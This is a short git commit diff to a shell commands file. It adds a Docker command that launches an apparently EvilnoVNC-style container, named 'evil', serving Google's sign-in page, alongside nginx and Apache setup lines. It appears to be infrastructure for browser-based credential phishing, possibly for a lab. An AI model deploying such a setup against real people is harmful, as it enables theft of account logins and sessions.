abc790afee2a21acc3f78409b73482a4d4f16be7
EduGM - Wanetty <eduard.gm@gmail.com>
2022-11-07 21:54:23 +0100

    Update commands.sh

--- Files/commands.sh
+++ Files/commands.sh
@@ -1,4 +1,5 @@
 sudo docker run --name nginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd):/usr/share/nginx/html --network nginx-evil -p 8080:8080 -d nginx
+sudo docker run -d --rm  -v "${PWD}/Downloads":"/home/user/Downloads" -e FOLDER=google -e RESOLUTION=1920x1080x24 -e WEBPAGE=https://accounts.google.com/ --network=nginx-evil --name evilnovnc1 evil_edu
 sudo docker exec nginx nginx -t
 sudo docker exec nginx nginx -s reload
 apt update && apt install apache2 php7.4 vim -y
